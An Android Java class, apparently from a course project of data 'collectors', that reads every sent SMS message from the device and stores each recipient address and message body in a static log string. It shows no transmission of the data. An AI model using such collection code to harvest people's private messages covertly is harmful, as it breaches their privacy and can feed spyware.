package yalimov.course.collectors;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import static yalimov.course.Common.DEBUG_TAG;
import static yalimov.course.Common.DELIMITER;
import static yalimov.course.Common.ERROR_TAG;

public class MessagesCollector
{
    private static String MessagesLog = "";

    public static String getMessagesLog()
    {
        return MessagesLog;
    }

    public static void GetMessagesInfo(Context contex)
    {
        String result = "SMS history:\n" + DELIMITER + "\n";
        try
        {
            Cursor cursor = contex.getContentResolver().query(Uri.parse("content://sms/sent"),
                    null, null, null, null);
            cursor.moveToFirst();

            do
            {
                result += "From: [" + cursor.getString(cursor.getColumnIndex("address")) + "]\n"
                        + "Body: [\n" + cursor.getString(cursor.getColumnIndex("body")) + "\n]\n" + DELIMITER + "\n";
            }
            while (cursor.moveToNext());

            cursor.close();
        }
        catch (Exception ex)
        {
            Log.d(DEBUG_TAG, ex.getMessage());
            result = ERROR_TAG;
        }
        MessagesLog = result;
    }
}
